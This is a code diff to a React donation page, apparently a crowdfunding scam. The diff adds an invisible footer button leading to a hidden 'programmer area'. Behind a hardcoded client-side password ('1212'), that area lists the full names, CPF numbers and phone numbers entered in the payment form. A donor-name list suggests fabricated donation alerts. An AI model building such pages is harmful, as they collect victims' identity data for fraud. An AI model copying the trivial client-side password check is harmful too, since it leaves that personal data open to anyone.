@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Search, Heart, Share, ShieldCheck, Copy, Check, Menu, X, MessageCircle, Facebook, Twitter, Link as LinkIcon, ArrowLeft, Lock } from 'lucide-react';
+import { Search, Heart, Share, ShieldCheck, Copy, Check, Menu, X, MessageCircle, Facebook, Twitter, Link as LinkIcon, ArrowLeft, Lock, Users, DollarSign, Calendar } from 'lucide-react';
 
 const DONOR_NAMES = [
   'Henrique', 'Ana', 'Carlos', 'Mariana', 'João', 'Beatriz', 'Lucas', 'Fernanda', 
@@ -14,7 +14,7 @@ type DonationNotification = {
 };
 
 export default function App() {
-  const [currentPage, setCurrentPage] = useState<'home' | 'payment'>('home');
+  const [currentPage, setCurrentPage] = useState<'home' | 'payment' | 'admin'>('home');
   const [activeTab, setActiveTab] = useState('sobre');
   const [copiedPix, setCopiedPix] = useState(false);
   const [copiedLink, setCopiedLink] = useState(false);
@@ -104,6 +104,10 @@ export default function App() {
         <PaymentPage onBack={() => setCurrentPage('home')} initialValue={donationValue} />
       </>
     );
+  }
+
+  if (currentPage === 'admin') {
+    return <AdminPage onBack={() => setCurrentPage('home')} />;
   }
 
   return (
@@ -590,11 +594,170 @@ export default function App() {
               </ul>
             </div>
           </div>
-          <div className="border-t border-gray-800 pt-8 flex flex-col md:flex-row items-center justify-between text-xs">
+          <div className="border-t border-gray-800 pt-8 flex flex-col md:flex-row items-center justify-between text-xs relative">
             <p>&copy; 2026 Vaquinha Solidária. Todos os direitos reservados.</p>
+            <button 
+              onClick={() => setCurrentPage('admin')} 
+              className="absolute right-0 bottom-0 w-6 h-6 opacity-0 hover:opacity-30 transition-opacity flex items-center justify-center cursor-default"
+              aria-label="Admin"
+            >
+              <Lock size={12} className="text-gray-500" />
+            </button>
           </div>
         </div>
       </footer>
+    </div>
+  );
+}
+
+function AdminPage({ onBack }: { onBack: () => void }) {
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [password, setPassword] = useState('');
+  const [error, setError] = useState(false);
+  const [cadastros, setCadastros] = useState<any[]>([]);
+  const [isLoading, setIsLoading] = useState(true);
+
+  useEffect(() => {
+    if (!isAuthenticated) return;
+    
+    fetch('/api/cadastros')
+      .then(res => res.json())
+      .then(data => {
+        setCadastros(data);
+        setIsLoading(false);
+      })
+      .catch(err => {
+        console.error('Erro ao buscar cadastros:', err);
+        setIsLoading(false);
+      });
+  }, [isAuthenticated]);
+
+  const handleLogin = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (password === '1212') {
+      setIsAuthenticated(true);
+      setError(false);
+    } else {
+      setError(true);
+      setPassword('');
+    }
+  };
+
+  if (!isAuthenticated) {
+    return (
+      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4 font-sans">
+        <div className="bg-gray-800 p-8 rounded-2xl w-full max-w-sm border border-gray-700 shadow-2xl">
+          <div className="flex justify-center mb-6">
+            <div className="w-12 h-12 bg-gray-700 rounded-full flex items-center justify-center">
+              <Lock size={24} className="text-green-400" />
+            </div>
+          </div>
+          <h2 className="text-white font-bold text-xl mb-6 text-center">Acesso Restrito</h2>
+          <form onSubmit={handleLogin}>
+            <input
+              type="password"
+              value={password}
+              onChange={(e) => { setPassword(e.target.value); setError(false); }}
+              className="w-full bg-gray-900 border border-gray-700 text-white px-4 py-3 rounded-xl outline-none focus:border-green-500 mb-4 text-center tracking-[0.5em] text-lg"
+              placeholder="••••"
+              autoFocus
+            />
+            {error && <p className="text-red-400 text-xs text-center mb-4 font-medium">Senha incorreta</p>}
+            <div className="flex gap-3 mt-2">
+              <button type="button" onClick={onBack} className="flex-1 py-3 text-gray-400 hover:text-white transition-colors text-sm font-bold">
+                Voltar
+              </button>
+              <button type="submit" className="flex-1 bg-green-500 hover:bg-green-600 text-white font-bold py-3 rounded-xl transition-colors text-sm shadow-lg">
+                Entrar
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="min-h-screen bg-gray-50 flex flex-col font-sans text-gray-800">
+      <header className="bg-gray-900 text-white shadow-sm sticky top-0 z-50 w-full">
+        <div className="max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
+          <div className="flex items-center gap-4">
+            <button onClick={onBack} className="p-2 -ml-2 text-gray-400 hover:text-white hover:bg-gray-800 rounded-full transition-colors">
+              <ArrowLeft size={24} />
+            </button>
+            <h1 className="font-bold text-lg flex items-center gap-2">
+              <Lock size={18} className="text-green-400" />
+              Área do Programador
+            </h1>
+          </div>
+          <div className="text-xs bg-gray-800 px-3 py-1.5 rounded-full font-mono text-green-400 border border-gray-700">
+            {cadastros.length} registros
+          </div>
+        </div>
+      </header>
+
+      <main className="flex-1 max-w-4xl w-full mx-auto px-4 py-8">
+        <div className="mb-8">
+          <h2 className="text-2xl font-black text-gray-900 mb-2">Cadastros Recebidos</h2>
+          <p className="text-gray-600">Acompanhe em tempo real os dados preenchidos no formulário de pagamento.</p>
+        </div>
+
+        {isLoading ? (
+          <div className="flex justify-center py-12">
+            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-500"></div>
+          </div>
+        ) : cadastros.length === 0 ? (
+          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-12 text-center">
+            <Users size={48} className="mx-auto text-gray-300 mb-4" />
+            <h3 className="text-lg font-bold text-gray-900 mb-2">Nenhum cadastro ainda</h3>
+            <p className="text-gray-500">Os dados aparecerão aqui assim que alguém preencher o formulário.</p>
+          </div>
+        ) : (
+          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
+            <div className="overflow-x-auto">
+              <table className="w-full text-left text-sm">
+                <thead className="bg-gray-50 border-b border-gray-100 text-gray-600 font-bold uppercase text-xs tracking-wider">
+                  <tr>
+                    <th className="px-6 py-4">ID / Data</th>
+                    <th className="px-6 py-4">Nome Completo</th>
+                    <th className="px-6 py-4">CPF</th>
+                    <th className="px-6 py-4">Telefone</th>
+                    <th className="px-6 py-4 text-right">Valor</th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-gray-100">
+                  {cadastros.map((cadastro, idx) => (
+                    <tr key={idx} className="hover:bg-gray-50 transition-colors">
+                      <td className="px-6 py-4 whitespace-nowrap">
+                        <div className="font-mono font-bold text-gray-900">#{cadastro.id || '---'}</div>
+                        <div className="text-xs text-gray-500 flex items-center gap-1 mt-1">
+                          <Calendar size={12} />
+                          {new Date(cadastro.timestamp).toLocaleString('pt-BR')}
+                        </div>
+                      </td>
+                      <td className="px-6 py-4 font-medium text-gray-900">
+                        {cadastro.nome}
+                      </td>
+                      <td className="px-6 py-4 font-mono text-gray-600">
+                        {cadastro.cpf}
+                      </td>
+                      <td className="px-6 py-4 font-mono text-gray-600">
+                        {cadastro.telefone}
+                      </td>
+                      <td className="px-6 py-4 text-right whitespace-nowrap">
+                        <div className="inline-flex items-center gap-1 bg-green-50 text-green-700 px-2.5 py-1 rounded-lg font-bold">
+                          <DollarSign size={14} />
+                          {Number(cadastro.valor || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
+                        </div>
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          </div>
+        )}
+      </main>
     </div>
   );
 }
